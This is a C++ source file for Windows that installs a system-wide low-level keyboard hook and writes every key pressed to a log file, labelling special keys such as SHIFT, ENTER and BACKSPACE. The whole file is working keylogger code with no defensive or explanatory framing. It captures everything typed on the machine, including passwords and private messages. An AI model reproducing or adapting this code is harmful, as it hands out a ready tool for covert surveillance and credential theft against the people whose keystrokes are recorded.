#include "KeyboardHook.h"

std::ofstream logFile;

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

void SetHook(std::string file){
    
    logFile.open(file);

	_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);


}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {

	// ALT GR e ALT devolvem wParam == 260 em vez de 256 (WM_KEYDOWN)

	if (nCode >= 0){

		if (wParam == WM_KEYDOWN) {

			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            WriteKey(kbdStruct.vkCode);

        }

	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void WriteKey(int key) {

	switch (key) {
	case 160:
		logFile << "[SHIFT]";
		break;
	case VK_CAPITAL:
		logFile << "[CAPS]";
		break;
	case VK_MENU:
		logFile << "[ALT]";
		break;
	case VK_BACK:
		logFile << "[BACKSPACE]";
		break;
	case VK_TAB:
		logFile << "[TAB]";
		break;
	case VK_RETURN:
		logFile << "[ENTER]";
		break;
	case VK_SPACE:
		logFile << "[SPACE]";
		break;
	case 130:
		logFile << "�";
		break;
	case VK_DELETE:
		logFile << "[DELETE]";
		break;
	case 190:
		logFile << "[. or :]";
		break;
	case 188:
		logFile << "[, or ;]";
		break;
	case 187:
		logFile << "[+ or *]";
		break;
	case 191:
		logFile << "[~ or ^]";
		break;
	case 189:
		logFile << "[- or _]";
		break;
	case 164:
		break;
	default:
		logFile << (char)key;
	}
}